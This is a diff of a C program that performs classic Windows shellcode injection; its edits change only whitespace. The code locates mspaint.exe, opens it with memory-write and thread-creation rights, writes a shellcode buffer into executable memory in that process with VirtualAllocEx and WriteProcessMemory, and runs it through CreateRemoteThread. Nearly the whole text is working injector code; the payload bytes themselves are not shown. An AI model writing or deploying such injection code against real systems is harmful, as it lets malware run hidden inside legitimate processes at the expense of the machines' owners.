@@ -41,28 +41,25 @@ unsigned int lengthOfShellcodePayload = 329;
 
 
 int SearchForProcess(const char *processName) {
-
         HANDLE hSnapshotOfProcesses;
         PROCESSENTRY32 processStruct;
         int pid = 0;
                 
         hSnapshotOfProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if (INVALID_HANDLE_VALUE == hSnapshotOfProcesses) return 0;
-                
+        if (INVALID_HANDLE_VALUE == hSnapshotOfProcesses) return 0;      
         processStruct.dwSize = sizeof(PROCESSENTRY32); 
                 
         if (!Process32First(hSnapshotOfProcesses, &processStruct)) {
-                CloseHandle(hSnapshotOfProcesses);
-                return 0;
+			CloseHandle(hSnapshotOfProcesses);
+			return 0;
         }
                 
         while (Process32Next(hSnapshotOfProcesses, &processStruct)) {
-                if (lstrcmpiA(processName, processStruct.szExeFile) == 0) {
-                        pid = processStruct.th32ProcessID;
-                        break;
-                }
+			if (lstrcmpiA(processName, processStruct.szExeFile) == 0) {
+				pid = processStruct.th32ProcessID;
+				break;
+			}
         }
-                
         CloseHandle(hSnapshotOfProcesses);
                 
         return pid;
@@ -70,29 +67,25 @@ int SearchForProcess(const char *processName) {
 
 
 int ShellcodeInject(HANDLE hProcess, unsigned char * shellcodePayload, unsigned int lengthOfShellcodePayload) {
+	LPVOID pRemoteProcAllocMem = NULL;
+	HANDLE hThread = NULL;
 
-        LPVOID pRemoteProcAllocMem = NULL;
-        HANDLE hThread = NULL;
-
-  
-        pRemoteProcAllocMem = VirtualAllocEx(hProcess, NULL, lengthOfShellcodePayload, MEM_COMMIT, PAGE_EXECUTE_READ);
-        WriteProcessMemory(hProcess, pRemoteProcAllocMem, (PVOID)shellcodePayload, (SIZE_T)lengthOfShellcodePayload, (SIZE_T *)NULL);
-        
-        hThread = CreateRemoteThread(hProcess, NULL, 0, pRemoteProcAllocMem, NULL, 0, NULL);
-        if (hThread != NULL) {
-                WaitForSingleObject(hThread, 500);
-                CloseHandle(hThread);
-                return 0;
-        }
-        return -1;
+	pRemoteProcAllocMem = VirtualAllocEx(hProcess, NULL, lengthOfShellcodePayload, MEM_COMMIT, PAGE_EXECUTE_READ);
+	WriteProcessMemory(hProcess, pRemoteProcAllocMem, (PVOID)shellcodePayload, (SIZE_T)lengthOfShellcodePayload, (SIZE_T *)NULL);
+	
+	hThread = CreateRemoteThread(hProcess, NULL, 0, pRemoteProcAllocMem, NULL, 0, NULL);
+	if (hThread != NULL) {
+		WaitForSingleObject(hThread, 500);
+		CloseHandle(hThread);
+		return 0;
+	}
+	return -1;
 }
 
 
 int main(void) {
-    
 	int pid = 0;
     HANDLE hProcess = NULL;
-
 	pid = SearchForProcess("mspaint.exe"); // arbitrary process chosen is mspaint here
 
 	if (pid) {
@@ -100,8 +93,8 @@ int main(void) {
 
 		// try to open target process
 		hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
-						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
-						FALSE, (DWORD) pid);
+			PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+			FALSE, (DWORD) pid);
 
 		if (hProcess != NULL) {
 			ShellcodeInject(hProcess, shellcodePayload, lengthOfShellcodePayload);
